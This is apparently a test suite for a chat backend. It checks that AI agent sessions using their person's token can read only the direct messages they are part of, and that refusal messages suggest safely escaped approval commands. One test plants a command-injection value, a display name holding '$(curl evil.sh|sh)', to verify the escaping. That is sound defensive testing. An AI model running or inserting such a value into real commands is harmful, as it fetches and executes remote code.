// A session reads chat with its person's token, so the person's access alone
// would let any session on their machine read every DM they are in. These
// tests drive the real /cli/chat/* routes the way `cast chat` does, stamped
// with the calling session (origin: "agent"), and pin which DMs a session may
// read: the ones it is part of, and no others.
import { describe, expect, setDefaultTimeout, test } from "bun:test";
import { convexTest } from "convex-test";
import { presentToken } from "@platform/auth/convex";
import schema from "./schema";
import type { Id } from "./_generated/dataModel";
import { allModules } from "./testModules.testkit";
import { hashToken } from "./apiTokens";
import { chatMentionClientId, chatRelayClientId } from "./lib/chatWakeIds";
import { api, internal } from "./_generated/api";
import { openSessionReply } from "./chatSessionReplies";

setDefaultTimeout(120_000);

const DEVICE = "device-mac-1";

async function setup() {
  const t = convexTest(schema, allModules);
  const ids = await t.run(async (ctx) => {
    const ashot = await ctx.db.insert("users", { name: "Ashot", email: "[email protected]", github_username: "ashot" } as any);
    const jordan = await ctx.db.insert("users", { name: "Jordan", email: "[email protected]", github_username: "jordan" } as any);
    const riley = await ctx.db.insert("users", { name: "Riley", email: "[email protected]", github_username: "riley" } as any);
    const team = await ctx.db.insert("teams", { name: "Team", invite_code: "TEAM1234", created_at: 1, features: { chat: true, org: true } } as any);
    for (const [user, at] of [[ashot, 1], [jordan, 2], [riley, 3]] as const) {
      await ctx.db.insert("team_memberships", { user_id: user, team_id: team, role: "member", joined_at: at } as any);
    }
    return { ashot, jordan, riley, team };
  });
  const tokens = {
    ashot: await token(t, ids.ashot),
    jordan: await token(t, ids.jordan),
  };
  return { t, ...ids, tokens };
}

async function token(t: any, user: Id<"users">) {
  const secret = `bound_${user}`;
  await t.run(async (ctx: any) => {
    await ctx.db.insert("api_tokens", { user_id: user, token_hash: await hashToken(secret), name: "mac", created_at: 1, last_used_at: 1, device_id: DEVICE });
    await ctx.db.insert("devices", { user_id: user, device_id: DEVICE, label: "mac", platform: "darwin", last_seen: 1 });
  });
  return presentToken(secret, DEVICE);
}

let shortSeq = 0;
async function session(t: any, user: Id<"users">, team: Id<"teams">, extra: Record<string, unknown> = {}) {
  const session_id = crypto.randomUUID();
  const short_id = `jx7${String(shortSeq++).padStart(4, "0")}`;
  const _id = await t.run(async (ctx: any) =>
    ctx.db.insert("conversations", {
      user_id: user,
      agent_type: "claude_code",
      session_id,
      short_id,
      started_at: 1,
      updated_at: 1,
      message_count: 0,
      is_private: false,
      team_id: team,
      team_visibility: "full",
      status: "active",
      ...extra,
    }),
  );
  return { _id: _id as Id<"conversations">, session_id, short_id };
}

async function post(t: any, path: string, body: Record<string, unknown>) {
  const res = await t.fetch(path, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
  return { status: res.status, body: await res.json() };
}

/** What `cast chat …` adds to a read when it runs inside a session. */
const asSession = (s: { session_id: string }) => ({ origin: "agent", origin_session_id: s.session_id });

async function dm(t: any, apiToken: string, team_id: Id<"teams">, handles: string[], extra: Record<string, unknown> = {}) {
  const res = await post(t, "/cli/chat/open-dm", { api_token: apiToken, team_id, handles, ...extra });
  expect(res.status).toBe(200);
  return res.body.channel_id as string;
}

async function send(t: any, apiToken: string, channel_id: string, content: string, extra: Record<string, unknown> = {}) {
  const res = await post(t, "/cli/chat/send", { api_token: apiToken, channel_id, content, ...extra });
  expect(res.status).toBe(200);
  return res.body.message_id as string;
}

async function anchorFor(t: any, host: Id<"users">, team: Id<"teams">) {
  return await t.run(async (ctx: any) => {
    const bot = await ctx.db.insert("users", { name: "Anchor", is_bot: true, bot_kind: "anchor" });
    await ctx.db.insert("team_memberships", { user_id: bot, team_id: team, role: "member", joined_at: 9 });
    const anchor = await ctx.db.insert("anchors", {
      scope_type: "team", team_id: team, bot_user_id: bot, host_user_id: host, name: "Anchor", status: "active", created_at: 1,
    });
    return { bot, anchor };
  });
}

/** Forget the person's read mark, so a line in the room counts as unread. */
const unreadAll = (t: any, user: Id<"users">) => t.run(async (ctx: any) => {
  for (const r of await ctx.db.query("chat_reads").collect()) if (String(r.user_id) === String(user)) await ctx.db.patch(r._id, { last_read_at: 0 });
});

const read = (t: any, api_token: string, channel_id: string, extra: Record<string, unknown> = {}) =>
  post(t, "/cli/chat/read", { api_token, channel_id, ...extra });

const text = (res: { body: any }) => JSON.stringify(res.body);

describe("a session reading its person's DMs", () => {
  test("a session with no part in a DM is refused on every read path, and the refusal says why and how to ask", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    const secret = await send(t, tokens.jordan, room, "between us: I am thinking of leaving");
    const s = await session(t, ashot, team);
    const stamp = asSession(s);

    const channelRead = await read(t, tokens.ashot, room, stamp);
    expect(channelRead.status).toBe(403);
    expect(text(channelRead)).not.toContain("leaving");
    const refusal: string = channelRead.body.error;
    expect(refusal).toContain("your person's direct message with Jordan");
    expect(refusal).toContain(`session ${s.short_id} is not part of it`);
    expect(refusal).toContain(`--run "cast chat read --channel ${room}"`);
    expect(refusal).toContain("The lines go into its transcript");

    const thread = await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: secret, ...stamp });
    expect(thread.status).toBe(403);
    expect(text(thread)).not.toContain("leaving");
    expect(thread.body.error).toContain(`cast chat thread ${secret}`);

    // The CLI names a message by a short prefix; the prefix resolves, the read is still refused.
    const message = await post(t, "/cli/chat/message", { api_token: tokens.ashot, message_id: secret.slice(0, 10), ...stamp });
    expect(message.status).toBe(403);
    expect(text(message)).not.toContain("leaving");

    const since = await post(t, "/cli/chat/lines-since", { api_token: tokens.ashot, channel_ids: [room], since: 0, ...stamp });
    expect(since.status).toBe(403);
    expect(text(since)).not.toContain("leaving");

    const scopedSearch = await post(t, "/cli/chat/search", { api_token: tokens.ashot, team_id: team, channel_id: room, q: "leaving", ...stamp });
    expect(scopedSearch.status).toBe(403);
    const search = await post(t, "/cli/chat/search", { api_token: tokens.ashot, team_id: team, q: "leaving", ...stamp });
    expect(search.status).toBe(200);
    expect(search.body.results).toEqual([]);

    await unreadAll(t, ashot);
    const channels = await post(t, "/cli/chat/channels", { api_token: tokens.ashot, team_id: team, ...stamp });
    expect(channels.status).toBe(200);
    expect(text(channels)).not.toContain("leaving");
    expect(channels.body.channels.map((c: any) => c._id)).not.toContain(room);
    expect(channels.body.rail.map((r: any) => r.channel_id)).not.toContain(room);
    expect(channels.body.unread_dm_messages ?? []).toEqual([]);
  });

  test("the person's own reads are unchanged: the apps and a terminal send no session stamp", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "between us: I am thinking of leaving");

    const own = await read(t, tokens.ashot, room);
    expect(own.status).toBe(200);
    expect(own.body.messages.map((m: any) => m.content)).toEqual(["between us: I am thinking of leaving"]);
    const search = await post(t, "/cli/chat/search", { api_token: tokens.ashot, team_id: team, q: "leaving" });
    expect(search.body.results).toHaveLength(1);
    await unreadAll(t, ashot);
    const channels = await post(t, "/cli/chat/channels", { api_token: tokens.ashot, team_id: team });
    expect(channels.body.channels.map((c: any) => c._id)).toContain(room);
    expect(channels.body.unread_dm_messages.map((m: any) => m.content)).toEqual(["between us: I am thinking of leaving"]);
    // Jordan, in the app, reads it too.
    expect((await read(t, tokens.jordan, room)).body.messages).toHaveLength(1);
  });

  test("public channels stay open to a session; only DMs are closed", async () => {
    const { t, team, ashot, tokens } = await setup();
    const created = await post(t, "/cli/chat/create-channel", { api_token: tokens.ashot, team_id: team, name: "general" });
    const general = created.body.channel_id;
    await send(t, tokens.jordan, general, "deploy is green");
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "deploy gossip");
    const s = await session(t, ashot, team);

    const res = await read(t, tokens.ashot, general, asSession(s));
    expect(res.status).toBe(200);
    expect(res.body.messages.map((m: any) => m.content)).toEqual(["deploy is green"]);
    const search = await post(t, "/cli/chat/search", { api_token: tokens.ashot, team_id: team, q: "deploy", ...asSession(s) });
    expect(search.body.results.map((r: any) => r.channel_id)).toEqual([general]);
    // A wake frame's many rooms drop the closed DM and keep the rest.
    const since = await post(t, "/cli/chat/lines-since", { api_token: tokens.ashot, channel_ids: [general, room], since: 0, ...asSession(s) });
    expect(since.status).toBe(200);
    expect(since.body.lines.map((l: any) => l.text)).toEqual(["deploy is green"]);
  });

  test("a session reads its own DM room: the one it opened with cast chat dm", async () => {
    const { t, team, ashot, tokens } = await setup();
    const s = await session(t, ashot, team);
    const own = await dm(t, tokens.ashot, team, ["jordan"], asSession(s));
    await send(t, tokens.ashot, own, "can you review the patch?", asSession(s));
    await send(t, tokens.jordan, own, "looks fine to me");
    const res = await read(t, tokens.ashot, own, asSession(s));
    expect(res.status).toBe(200);
    expect(res.body.messages.map((m: any) => m.content)).toEqual(expect.arrayContaining(["can you review the patch?", "looks fine to me"]));
    // Another session of the same person has no part in it.
    const other = await session(t, ashot, team);
    expect((await read(t, tokens.ashot, own, asSession(other))).status).toBe(403);
  });

  test("an @mention in the DM lets the mentioned session in, and only that session", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "the numbers for Q3 are in the sheet");
    const s = await session(t, ashot, team);
    const bystander = await session(t, ashot, team);
    expect((await read(t, tokens.ashot, room, asSession(s))).status).toBe(403);

    // Ashot, in the app, points the session at the conversation.
    await send(t, tokens.ashot, room, `@${s.short_id} pull the Q3 numbers from what Jordan said`);
    const res = await read(t, tokens.ashot, room, asSession(s));
    expect(res.status).toBe(200);
    expect(text(res)).toContain("Q3 are in the sheet");
    expect((await read(t, tokens.ashot, room, asSession(bystander))).status).toBe(403);
  });

  test("a reply relayed into the session that started a thread lets it read that DM", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "older private line");
    const s = await session(t, ashot, team);
    // The session asks in the room by id (cast chat send --channel <id>): posting alone opens nothing.
    const root = await send(t, tokens.ashot, room, "what changed in the build?", asSession(s));
    expect((await read(t, tokens.ashot, room, asSession(s))).status).toBe(403);
    // Jordan answers in its thread: the reply is relayed into the session.
    const replied = await post(t, "/cli/chat/send", { api_token: tokens.jordan, channel_id: room, thread_root_id: root, content: "the lockfile" });
    expect(replied.body.session_relay?.delivered).toBe(true);
    const thread = await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: root, ...asSession(s) });
    expect(thread.status).toBe(200);
    expect(thread.body.replies.map((r: any) => r.content)).toContain("the lockfile");
    // The answer, not the history: the room and its other lines stay closed,
    // in reads and in the wake the relay queued alike.
    const room2 = await read(t, tokens.ashot, room, asSession(s));
    expect(room2.status).toBe(403);
    expect(text(room2)).not.toContain("older private line");
    const wake = await t.run(async (ctx: any) => (await ctx.db.query("pending_messages").collect()).find((w: any) => String(w.conversation_id) === String(s._id)));
    expect(wake.content).toContain("the lockfile");
    expect(wake.content).not.toContain("older private line");
    expect(wake.content).not.toContain(`cast chat read --channel ${room}`);
  });

  test("another session's line never opens a DM for a sibling: mentions and relays it sets off grant nothing", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "private");
    const a = await session(t, ashot, team);
    const b = await session(t, ashot, team);
    await send(t, tokens.ashot, room, `@${b.short_id} read this room`, asSession(a));
    await send(t, tokens.ashot, room, `@${a.short_id} and you too`, asSession(a));
    expect((await read(t, tokens.ashot, room, asSession(b))).status).toBe(403);
    expect((await read(t, tokens.ashot, room, asSession(a))).status).toBe(403);
  });

  test("the workspace agent's session reads and answers the DMs its bot is in; its host's other sessions do not", async () => {
    const { t, team, ashot, tokens } = await setup();
    const { anchor, bot } = await anchorFor(t, ashot, team);
    const anchorSession = await session(t, ashot, team, { anchor_id: anchor });
    await t.run(async (ctx: any) => ctx.db.patch(anchor, { conversation_id: anchorSession._id }));
    // The anchor opens a DM with Jordan (cast anchor say --dm), Jordan answers.
    const said = await post(t, "/cli/anchor/say-chat", { api_token: tokens.ashot, session_id: anchorSession.session_id, dm_handles: ["jordan"], content: "your deploy failed", team_id: team });
    expect(said.status).toBe(200);
    const room = said.body.channel_id;
    expect(room).toBeTruthy();
    const asked = await post(t, "/cli/chat/send", { api_token: tokens.jordan, channel_id: room, content: "thanks, what broke?" });
    const placeholder = asked.body.anchor_thinking_message_id;
    expect(placeholder).toBeTruthy();

    const res = await read(t, tokens.ashot, room, asSession(anchorSession));
    expect(res.status).toBe(200);
    expect(res.body.messages.map((m: any) => m.content)).toEqual(expect.arrayContaining(["your deploy failed", "thanks, what broke?"]));

    // The wake's thread, then the answer (cast chat thread, cast chat reply), from the anchor's session.
    const root = res.body.messages.find((m: any) => m.content === "thanks, what broke?")?._id;
    const thread = await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: root ?? placeholder, ...asSession(anchorSession) });
    expect(thread.status).toBe(200);
    const replied = await post(t, "/cli/chat/reply", { api_token: tokens.ashot, message_id: placeholder, content: "the migration step timed out", status: "done" });
    expect(replied.status).toBe(200);
    const after = await post(t, "/cli/chat/message", { api_token: tokens.ashot, message_id: placeholder, ...asSession(anchorSession) });
    expect(after.status).toBe(200);
    expect(after.body.message.content).toBe("the migration step timed out");
    expect(after.body.message.user_id).toBe(bot);

    const unrelated = await session(t, ashot, team);
    expect((await read(t, tokens.ashot, room, asSession(unrelated))).status).toBe(403);
    expect((await post(t, "/cli/chat/message", { api_token: tokens.ashot, message_id: placeholder, ...asSession(unrelated) })).status).toBe(403);
  });

  test("a stamp naming no session of the caller's is refused rather than trusted", async () => {
    const { t, team, jordan, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "private");
    const jordans = await session(t, jordan, team);
    const unknown = await read(t, tokens.ashot, room, { origin: "agent", origin_session_id: crypto.randomUUID() });
    expect(unknown.status).toBe(403);
    expect(unknown.body.error).toContain("cannot match this session");
    expect(unknown.body.error).toContain("--run");
    // Naming a teammate's session borrows nothing: it is not the caller's.
    expect((await read(t, tokens.ashot, room, asSession(jordans))).status).toBe(403);
  });

  test("posting into the DM does not open it: one line from the session is not membership", async () => {
    const { t, team, ashot, tokens } = await setup();
    const s = await session(t, ashot, team);
    // Naming the person too finds the person's own DM, not the session's room.
    const room = await dm(t, tokens.ashot, team, ["ashot", "jordan"], asSession(s));
    expect(room).toBe(await dm(t, tokens.ashot, team, ["jordan"]));
    await send(t, tokens.jordan, room, "between us: I am thinking of leaving");
    await send(t, tokens.ashot, room, "ok", asSession(s));
    const res = await read(t, tokens.ashot, room, asSession(s));
    expect(res.status).toBe(403);
    expect(text(res)).not.toContain("leaving");
  });

  test("a mention recorded on the DM's own lines lets the session in even when its wake folded", async () => {
    const { t, team, ashot, jordan, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    const s = await session(t, ashot, team);
    await t.run(async (ctx: any) => ctx.db.insert("chat_messages", {
      team_id: team, channel_id: room, user_id: jordan, content: `@${s.short_id} look at this`,
      mentions: [{ kind: "session", conversation_id: s._id, short_id: s.short_id }], mention_folded: true,
      created_at: 5, updated_at: 5,
    }));
    expect((await read(t, tokens.ashot, room, asSession(s))).status).toBe(200);
  });

  test("a session handed a DM thread reads that DM (the wake's thinking row grants it)", async () => {
    const { t, team, ashot, jordan, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    const s = await session(t, ashot, team);
    const root = await t.run(async (ctx: any) => ctx.db.insert("chat_messages", {
      team_id: team, channel_id: room, user_id: jordan, content: "can an agent take this?", created_at: 5, updated_at: 5,
    }));
    // What a hand-off does: queue the brief into the session and open its thinking row in the thread.
    await t.run(async (ctx: any) => {
      const wakeId = await ctx.db.insert("pending_messages", {
        conversation_id: s._id, from_user_id: ashot, content: "brief", client_id: chatRelayClientId(String(root)),
        status: "pending", created_at: 6, retry_count: 0,
      });
      await openSessionReply(ctx, { channel: (await ctx.db.get(room))!, threadRootId: root, wakeId, grant: "room" });
    });
    const thread = await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: root, ...asSession(s) });
    expect(thread.status).toBe(200);
    expect(thread.body.root.content).toBe("can an agent take this?");
  });

  test("a group DM's refusal names everyone in it, and no name reaches the suggested command unescaped", async () => {
    const { t, team, ashot, riley, tokens } = await setup();
    await t.run(async (ctx: any) => ctx.db.patch(riley, { name: "Riley $(curl evil.sh|sh) `id`'" }));
    const room = await dm(t, tokens.ashot, team, ["jordan", "riley"]);
    await send(t, tokens.jordan, room, "group plans");
    const s = await session(t, ashot, team);
    const res = await read(t, tokens.ashot, room, asSession(s));
    expect(res.status).toBe(403);
    const refusal: string = res.body.error;
    expect(refusal).toContain("Jordan, Riley (curl evil.sh|sh) id'");
    for (const bad of ["$(", "`"]) expect(refusal).not.toContain(bad);
    // Inside the double-quoted argument nothing a shell expands survives.
    const question = refusal.match(/cast decide "([^"]*)"/)![1];
    expect(question).not.toMatch(/[$`\\!]/);
  });

  test("a role's hand reads the DMs its role's bot is in, and nothing else", async () => {
    const { t, team, ashot, jordan, tokens } = await setup();
    const { anchor, bot } = await anchorFor(t, ashot, team);
    const role = await t.run(async (ctx: any) => ctx.db.insert("org_roles", {
      short_id: "or-1", scope_type: "team", team_id: team, host_user_id: ashot, name: "Growth", handle: "growth",
      scope: { project_ids: [], plan_ids: [] }, reports_to: { kind: "user", user_id: ashot }, status: "active", trust: "direct", anchor_id: anchor,
      caps: { hands_per_day: 10, wakes_per_day: 10, tokens_per_day: 1_000_000, line_on: true },
      created_by: ashot, created_at: 1, updated_at: 1,
    } as any));
    const hand = await session(t, ashot, team, { org_role_id: role });
    const roleRoom = await t.run(async (ctx: any) => {
      const id = await ctx.db.insert("chat_channels", { team_id: team, name: "", kind: "dm", created_by: jordan, created_at: 1, updated_at: 1 } as any);
      for (const u of [bot, jordan]) await ctx.db.insert("chat_channel_members", { channel_id: id, user_id: u, added_by: jordan, added_at: 1 });
      await ctx.db.insert("chat_messages", { team_id: team, channel_id: id, user_id: jordan, content: "growth numbers please", created_at: 2, updated_at: 2 });
      return id;
    });
    const res = await read(t, tokens.ashot, roleRoom, asSession(hand));
    expect(res.status).toBe(200);
    expect(text(res)).toContain("growth numbers please");
    const personal = await dm(t, tokens.ashot, team, ["jordan"]);
    expect((await read(t, tokens.ashot, personal, asSession(hand))).status).toBe(403);
  });

  test("a single-room --since read is refused aloud; the refusal's card runs a read the person can approve", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "private");
    const s = await session(t, ashot, team);
    const res = await post(t, "/cli/chat/lines-since", { api_token: tokens.ashot, channel_ids: [room], since: 42, ...asSession(s) });
    expect(res.status).toBe(403);
    expect(res.body.error).toContain(`--run "cast chat read --channel ${room} --since 42"`);
    const page = await read(t, tokens.ashot, room, { ...asSession(s), limit: 5, cursor: "abc" });
    expect(page.body.error).toContain(`--run "cast chat read --channel ${room} -n 5"`);
    const search = await post(t, "/cli/chat/search", { api_token: tokens.ashot, team_id: team, channel_id: room, q: "it's $(x)", ...asSession(s) });
    expect(search.body.error).toContain(`--run "cast chat read --channel ${room}"`);
    expect(search.body.error).not.toContain("$(x)");
  });

  test("a session's answer relayed to the session that mentioned it grants the asker nothing", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "private");
    const asker = await session(t, ashot, team);
    const replier = await session(t, ashot, team);
    const root = await send(t, tokens.ashot, room, `@${replier.short_id} what do you think?`, asSession(asker));
    await post(t, "/cli/chat/send", { api_token: tokens.ashot, channel_id: room, thread_root_id: root, content: "I think yes", ...asSession(replier) });
    expect((await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: root, ...asSession(asker) })).status).toBe(403);
    expect((await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: root, ...asSession(replier) })).status).toBe(403);
    // The answer still reaches the asker, without pointing it at reads it would be refused.
    const wake = await t.run(async (ctx: any) => (await ctx.db.query("pending_messages").collect()).find((w: any) => String(w.conversation_id) === String(asker._id)));
    expect(wake.content).toContain("I think yes");
    expect(wake.content).not.toContain("cast chat thread");
    expect(wake.content).not.toContain("cast chat read");
  });

  test("the backfill grants what wakes delivered before grants existed: a mention the room, a relay its thread", async () => {
    const { t, team, ashot, jordan, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    const mentioned = await session(t, ashot, team);
    const relayed = await session(t, ashot, team);
    const ids = await t.run(async (ctx: any) => {
      const line = await ctx.db.insert("chat_messages", { team_id: team, channel_id: room, user_id: ashot, content: "hey session", created_at: 5, updated_at: 5 });
      const root = await ctx.db.insert("chat_messages", { team_id: team, channel_id: room, user_id: ashot, content: "a root", origin: "agent", origin_session_id: String(relayed._id), created_at: 6, updated_at: 6 });
      const reply = await ctx.db.insert("chat_messages", { team_id: team, channel_id: room, thread_root_id: root, user_id: jordan, content: "a reply", created_at: 7, updated_at: 7 });
      await ctx.db.insert("pending_messages", { conversation_id: mentioned._id, from_user_id: ashot, content: "w", client_id: chatMentionClientId(String(line), String(mentioned._id)), status: "delivered", created_at: 8, retry_count: 0 });
      await ctx.db.insert("pending_messages", { conversation_id: relayed._id, from_user_id: jordan, content: "w", client_id: chatRelayClientId(String(reply)), status: "delivered", created_at: 9, retry_count: 0 });
      return { root };
    });
    expect((await read(t, tokens.ashot, room, asSession(mentioned))).status).toBe(403);
    await t.mutation(internal.chat.backfillSessionRooms, {});
    expect((await read(t, tokens.ashot, room, asSession(mentioned))).status).toBe(200);
    expect((await read(t, tokens.ashot, room, asSession(relayed))).status).toBe(403);
    expect((await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: ids.root, ...asSession(relayed) })).status).toBe(200);
    // A person's mention that folded queued no wake: the second pass reads it off the line.
    const folded = await session(t, ashot, team);
    const far = await t.run(async (ctx: any) => {
      const other = await ctx.db.insert("chat_channels", { team_id: team, name: "", kind: "dm", created_by: ashot, created_at: 1, updated_at: 1 });
      for (const u of [ashot, jordan]) await ctx.db.insert("chat_channel_members", { channel_id: other, user_id: u, added_by: ashot, added_at: 1 });
      await ctx.db.insert("chat_messages", { team_id: team, channel_id: other, user_id: ashot, content: `@${folded.short_id}`, mentions: [{ kind: "session", conversation_id: folded._id, short_id: folded.short_id }], mention_folded: true, created_at: 10, updated_at: 10 });
      for (let i = 0; i < 310; i++) await ctx.db.insert("chat_messages", { team_id: team, channel_id: other, user_id: jordan, content: `line ${i}`, created_at: 11 + i, updated_at: 11 + i });
      return other;
    });
    expect((await read(t, tokens.ashot, far, asSession(folded))).status).toBe(403);
    // A hand-off's brief rides a relay key: the root's bound session gets the room, whoever wrote the line.
    const handed = await session(t, ashot, team);
    await t.run(async (ctx: any) => {
      const root = await ctx.db.insert("chat_messages", { team_id: team, channel_id: far, user_id: ashot, content: "agent wrote this", origin: "agent", origin_session_id: "someone-else", bound_session_id: String(handed._id), created_at: 400, updated_at: 400 });
      await ctx.db.insert("pending_messages", { conversation_id: handed._id, from_user_id: ashot, content: "brief", client_id: chatRelayClientId(String(root)), status: "delivered", created_at: 401, retry_count: 0 });
    });
    await t.mutation(internal.chat.backfillSessionRooms, {});
    expect((await read(t, tokens.ashot, far, asSession(handed))).status).toBe(200);
    await t.mutation(internal.chat.backfillSessionRooms, { phase: "mentions" });
    expect((await read(t, tokens.ashot, far, asSession(folded))).status).toBe(200);
  });

  test("an earlier session of a reseated workspace agent no longer reads its bot's DMs", async () => {
    const { t, team, ashot, tokens } = await setup();
    const { anchor } = await anchorFor(t, ashot, team);
    const old = await session(t, ashot, team, { anchor_id: anchor });
    const current = await session(t, ashot, team, { anchor_id: anchor });
    await t.run(async (ctx: any) => ctx.db.patch(anchor, { conversation_id: current._id }));
    const said = await post(t, "/cli/anchor/say-chat", { api_token: tokens.ashot, session_id: current.session_id, dm_handles: ["jordan"], content: "hello", team_id: team });
    const room = said.body.channel_id;
    expect((await read(t, tokens.ashot, room, asSession(current))).status).toBe(200);
    expect((await read(t, tokens.ashot, room, asSession(old))).status).toBe(403);
  });

  test("a person's mention of a role's standing session is the role's grant: the next seat keeps the room", async () => {
    const { t, team, ashot, tokens } = await setup();
    const role = await t.run(async (ctx: any) => ctx.db.insert("org_roles", {
      short_id: "or-2", scope_type: "team", team_id: team, host_user_id: ashot, name: "Ops", handle: "ops",
      scope: { project_ids: [], plan_ids: [] }, reports_to: { kind: "user", user_id: ashot }, status: "active", trust: "direct",
      caps: { hands_per_day: 10, wakes_per_day: 10, tokens_per_day: 1_000_000, line_on: true },
      created_by: ashot, created_at: 1, updated_at: 1,
    } as any));
    const seat = await session(t, ashot, team, { standing_role_id: role });
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "ops question");
    await send(t, tokens.ashot, room, `@${seat.short_id} can you look`);
    expect((await read(t, tokens.ashot, room, asSession(seat))).status).toBe(200);
    const nextSeat = await session(t, ashot, team, { standing_role_id: role });
    expect((await read(t, tokens.ashot, room, asSession(nextSeat))).status).toBe(200);
  });

  test("a person's reply that also @mentions the thread's session opens the room, not just the thread", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "older private line");
    const s = await session(t, ashot, team);
    const root = await send(t, tokens.ashot, room, "status?", asSession(s));
    await post(t, "/cli/chat/send", { api_token: tokens.ashot, channel_id: room, thread_root_id: root, content: `@${s.short_id} read the room above` });
    const res = await read(t, tokens.ashot, room, asSession(s));
    expect(res.status).toBe(200);
    expect(text(res)).toContain("older private line");
  });

  test("a workflow station of a role's run reads the role bot's DMs it speaks in, as a hand does", async () => {
    const { t, team, ashot, jordan, tokens } = await setup();
    const { anchor, bot } = await anchorFor(t, ashot, team);
    const role = await t.run(async (ctx: any) => ctx.db.insert("org_roles", {
      short_id: "or-3", scope_type: "team", team_id: team, host_user_id: ashot, name: "QA", handle: "qa",
      scope: { project_ids: [], plan_ids: [] }, reports_to: { kind: "user", user_id: ashot }, status: "active", trust: "direct", anchor_id: anchor,
      caps: { hands_per_day: 10, wakes_per_day: 10, tokens_per_day: 1_000_000, line_on: true },
      created_by: ashot, created_at: 1, updated_at: 1,
    } as any));
    const run = await t.run(async (ctx: any) => ctx.db.insert("workflow_runs", { user_id: ashot, team_id: team, workflow_name: "line", status: "running", org_role_id: role, node_statuses: [], created_at: 1, updated_at: 1 } as any));
    const station = await session(t, ashot, team, { workflow_run_id: run });
    const roleRoom = await t.run(async (ctx: any) => {
      const id = await ctx.db.insert("chat_channels", { team_id: team, name: "", kind: "dm", created_by: jordan, created_at: 1, updated_at: 1 } as any);
      for (const u of [bot, jordan]) await ctx.db.insert("chat_channel_members", { channel_id: id, user_id: u, added_by: jordan, added_at: 1 });
      return id;
    });
    expect((await read(t, tokens.ashot, roleRoom, asSession(station))).status).toBe(200);
  });

  test("a person's mention of a role's seat opens the room to the seat, not to the role's hands", async () => {
    const { t, team, ashot, tokens } = await setup();
    const role = await t.run(async (ctx: any) => ctx.db.insert("org_roles", {
      short_id: "or-4", scope_type: "team", team_id: team, host_user_id: ashot, name: "Ops", handle: "ops",
      scope: { project_ids: [], plan_ids: [] }, reports_to: { kind: "user", user_id: ashot }, status: "active", trust: "direct",
      caps: { hands_per_day: 10, wakes_per_day: 10, tokens_per_day: 1_000_000, line_on: true },
      created_by: ashot, created_at: 1, updated_at: 1,
    } as any));
    const seat = await session(t, ashot, team, { standing_role_id: role });
    const hand = await session(t, ashot, team, { org_role_id: role });
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    await send(t, tokens.jordan, room, "ops question");
    await send(t, tokens.ashot, room, `@${seat.short_id} can you look`);
    expect((await read(t, tokens.ashot, room, asSession(seat))).status).toBe(200);
    expect((await read(t, tokens.ashot, room, asSession(hand))).status).toBe(403);
  });

  test("a session handed a DM thread from the app reads that DM, and no other", async () => {
    const { t, team, ashot, tokens } = await setup();
    const room = await dm(t, tokens.ashot, team, ["jordan"]);
    const other = await dm(t, tokens.ashot, team, ["riley"]);
    await send(t, tokens.jordan, room, "older context in this DM");
    const root = await send(t, tokens.jordan, room, "can an agent fix the flaky deploy test?");
    await send(t, tokens.ashot, other, "something private with Riley");
    // Ashot presses Hand to agent on Jordan's line (the app's createSession with the thread linked).
    const convId = await t.withIdentity({ subject: `${ashot}|session` }).mutation(api.dispatch.dispatch, {
      action: "createSession",
      args: [{ agent_type: "claude_code", project_path: "/repo", session_id: "hand-session-1", linked_object: { type: "chat_thread", id: root } }],
    });
    const handed = await t.run(async (ctx: any) => ctx.db.get(convId));
    expect(handed.session_id).toBe("hand-session-1");
    const stamp = { origin: "agent", origin_session_id: "hand-session-1" };
    const res = await read(t, tokens.ashot, room, stamp);
    expect(res.status).toBe(200);
    expect(text(res)).toContain("older context in this DM");
    expect((await post(t, "/cli/chat/thread", { api_token: tokens.ashot, root_id: root, ...stamp })).status).toBe(200);
    const refused = await read(t, tokens.ashot, other, stamp);
    expect(refused.status).toBe(403);
    expect(text(refused)).not.toContain("something private");
  });
});
